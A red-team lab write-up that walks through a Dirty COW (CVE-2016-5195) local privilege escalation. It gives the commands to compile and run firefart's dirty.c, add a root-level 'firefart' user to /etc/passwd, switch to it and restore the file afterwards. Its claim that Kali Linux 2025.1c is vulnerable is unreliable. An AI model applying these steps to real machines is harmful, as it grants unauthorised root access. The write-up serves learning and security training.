# üêÑ Lab06 ‚Äì Dirty COW (CVE-2016-5195) Local Privilege Escalation

> **Date:** 7 June 2025  
> **Exploit:** Dirty COW ‚Äì Write-what-where race condition in Linux  
> **CVE:** [CVE-2016-5195](https://nvd.nist.gov/vuln/detail/CVE-2016-5195)  
> **Target System:** Kali Linux 2025.1c (x64)

---

## üõ°Ô∏è Description

This lab demonstrates a **local privilege escalation** attack using the Dirty COW vulnerability.  
It exploits a race condition in the Linux kernel‚Äôs memory subsystem that allows **unauthorized write access to read-only memory**. By leveraging this flaw, we created a new root-privileged user by modifying `/etc/passwd`.

---

## üéØ Target System

- **Operating System:** Kali Linux 2025.1c  
- **Kernel:** Vulnerable to Dirty COW  
- **Tool Used:** `dirty.c` (by [firefart](https://github.com/firefart))  
- **Exploit Result:** Gained root shell via custom user `firefart`

---

## üß® Exploitation Steps

1. **Transfer Exploit to Target**
   - Used VirtualBox Shared Folder to move `dirty.c` into the VM

2. **Compile the Exploit**
   ```bash
   gcc -pthread dirty.c -o dirty -lcrypt
   ```
3. **Run the Exploit**
   ```bash
   ./dirty
  - Chose a new password when prompted

  - Script modified /etc/passwd to insert a firefart user with UID=0
4. **Access Root via su**
  ```bash
  su firefart
  whoami   # ‚Üí root
  id       # ‚Üí uid=0(root)
```
5. **(Optional) Manual Fix**
If exploit entry is malformed:
```bash
sudo nano /etc/passwd
```
  - Correct the firefart line manually
6. **Clean Up**
    ```bash
    mv /tmp/passwd.bak /etc/passwd

---

## üìä Real-World Relevance
Dirty COW remained unpatched in many Linux systems for years. Even after its disclosure in 2016, production environments with unpatched kernels were exploited in the wild.
Understanding Dirty COW is essential for Red Teamers and system hardeners alike ‚Äî both for attack and defense.

---

## üß† What I Learned
How race conditions can be exploited to overwrite protected files

Deep understanding of how /etc/passwd and user privilege assignment works

Importance of system integrity and restoring state after exploitation

Practical use of privilege escalation techniques on real systems

How to handle system instability (e.g. high CPU usage, freezing) during kernel exploits


##Screenshots
Step	Description	Screenshot
1	Compiled dirty.c and ran the exploit	![Compile and run](https://github.com/ATTezel/RedTeam-Labs/blob/main/lab06/Screen%20Shot%202025-06-07%20at%2015.59.52.png)
2	Root shell obtained via su firefart	![Root shell](https://github.com/ATTezel/RedTeam-Labs/blob/main/lab06/Screen%20Shot%202025-06-07%20at%2015.57.03.png)
3	Verified UID=0 and restored passwd	![Cleanup](https://github.com/ATTezel/RedTeam-Labs/blob/main/lab06/Screen%20Shot%202025-06-07%20at%2016.00.08.png)

---

## üìÅ Notes
  - This exploit does not require internet access ‚Äî useful in air-gapped testing

  - Dirty COW is still exploitable on many embedded or neglected systems

  - Cleanup is critical ‚Äî careless use of Dirty COW can permanently damage /etc/passwd
